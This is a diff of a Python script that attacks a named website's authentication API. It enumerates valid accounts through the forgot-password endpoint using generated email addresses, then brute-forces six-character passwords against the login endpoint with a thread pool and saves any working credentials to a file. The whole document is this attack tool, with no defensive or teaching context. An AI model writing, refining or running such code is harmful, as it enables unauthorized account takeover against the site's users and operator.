@@ -1,23 +1,20 @@
 import requests
 import itertools
 import string
-import concurrent.futures
-
+from concurrent.futures import ThreadPoolExecutor
 def emailMaker():
     characters = string.ascii_letters + string.digits + '._%+-'
-    domains = ['@gmail.com', '@icloud.com', '@naver.com']
-    for length in range(2, 41):
+    domains = ['@gmail.com', '@icloud.com', '@naver.com', '@tsicscommunity.com']
+    for length in range(6, 20):
         permutations = itertools.permutations(characters, length)
         for permutation in permutations:
             username = ''.join(permutation)
             for domain in domains:
                 yield f"{username}{domain}"
-
 def codeMaker():
     chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
     for code in itertools.product(chars, repeat=6):
         yield "".join(code)
-
 def checkEmail(email):
     url = "https://www.revera-track.com/api/auth/forgot"
     payload = {
@@ -38,7 +35,6 @@ def checkEmail(email):
     else:
         print("Request failed with status code:", response.status_code)
         return False
-
 def checkCreds(email, password):
     url = "https://www.revera-track.com/api/auth/login"
     payload = {
@@ -52,37 +48,15 @@ def checkCreds(email, password):
         return True
     else:
         return False
-
-# File path to save the found credentials
-output_file = "/Users/lung/Desktop/loser.txt"
-
-# Maximum number of concurrent threads
-max_threads = 10
-
-# Iterate over emails and passwords, and save found credentials to file using thread pools
-with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor, open(output_file, "a") as file:
-    email_generator = emailMaker()
-    password_generator = codeMaker()
-
-    while True:
-        email_batch = list(itertools.islice(email_generator, max_threads))
-        if not email_batch:
-            break
-
-        future_to_email = {executor.submit(checkEmail, email): email for email in email_batch}
-        concurrent.futures.wait(future_to_email)
-
-        for future in future_to_email:
-            email = future_to_email[future]
-            if future.result():
-                print("Email is valid:", email)
-                password_batch = list(itertools.islice(password_generator, max_threads))
-                future_to_password = {executor.submit(checkCreds, email, password): password for password in password_batch}
-                concurrent.futures.wait(future_to_password)
-
-                for future in future_to_password:
-                    password = future_to_password[future]
-                    if future.result():
-                        print("Valid credentials found!")
-                        credentials = "Email: {}, Password: {}\n".format(email, password)
-                        file.write(credentials)
+def check_credentials(email, password):
+    if checkEmail(email):
+        print("Email is valid:", email)
+        if checkCreds(email, password):
+            print("Valid credentials found!")
+            print("Email: {}, Password: {}".format(email, password))
+            with open("/Users/lung/Desktop/loser.txt", "a") as file:
+                file.write("Email: {}, Password: {}\n".format(email, password))
+with ThreadPoolExecutor(max_workers=10) as executor:
+    for email in emailMaker():
+        print("Checking email:", email)
+        executor.map(check_credentials, [email], codeMaker())
